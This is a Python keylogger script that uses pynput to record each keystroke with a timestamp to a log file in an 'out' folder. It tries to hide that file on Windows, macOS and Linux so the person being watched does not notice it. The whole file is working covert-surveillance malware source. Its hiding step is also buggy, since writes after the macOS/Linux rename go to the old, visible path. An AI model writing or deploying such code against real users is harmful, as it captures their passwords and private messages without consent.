from pynput.keyboard import Listener, Key
import time
import os
import platform

# Get the current directory add a new directory to the current directory and create a logfile
dir = os.path.dirname(os.path.abspath(__file__))
out = os.path.join(dir, "out")
os.makedirs(out, exist_ok=True)
logfile = "keylog.text"
path = os.path.join(out, logfile)

if not os.path.exists(path):
    open(path, 'w').close()

# Hide the log file on Windows, Mac and Linux systems.
current_platform = platform.system()
if current_platform == "Windows":
    os.system(f'attrib +h "{path}"')
elif current_platform == "Darwin" or current_platform == "Linux":
    hiddenpath = os.path.join(dir, f".{logfile}")
    os.rename(path, hiddenpath)

# Set to store pressed keys for special keys.
pressedkeys = set()

# Function to handle key press events and write them to the log file.
def on_press(key):
    '''
    Generates a text log file containing the recorded keystrokes.
    Handles key press events, logging the pressed or held keys.

    Args:
        key (Any): The key that was pressed.
    '''
    global pressedkeys,listener

    # If the ESC key is pressed the listener stops
    if key == Key.esc:
            listener.stop()
            return
    
    with open(path, 'a') as logKey:
        try:
            logKey.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
        except AttributeError:
            # Handle special keys like control, enter, shift, etc.
            special_keys = {
                "Key.space": " [SPACE] ",
                "Key.enter": " [ENTER]\n",
                "Key.backspace": " [BACKSPACE] ",
                "Key.shift": " [LSHIFT] ",
                "Key.shift_r": " [RSHIFT]",
                "Key.ctrl_l": " [LCTRL] ",
                "Key.ctrl_r": " [RCTRL] ",
                "Key.alt_l": " [LALT] ",
                "Key.alt_gr": " [RALT] ",
                "Key.esc": " [ESCAPE] ",
                "Key.tab": " [TAB] ",
                "Key.delete": " [DELETE] ",
                "Key.caps_lock": " [CAPS LOCK] ",
                "Key.num_lock": " [NUM LOCK] ",
                "Key.scroll_lock": " [SCROLL LOCK] ",
            }

            if key not in pressedkeys:
                logKey.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {special_keys.get(str(key), str(key))}\n")
                pressedkeys.add(key)

# Function to handle key release events.
def on_release(key):
    '''
    Handles key release event and discards them from the pressedkeys list

    Args:
        key (Any): The key that was pressed.
    '''
    global pressedkeys
    pressedkeys.discard(key)
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
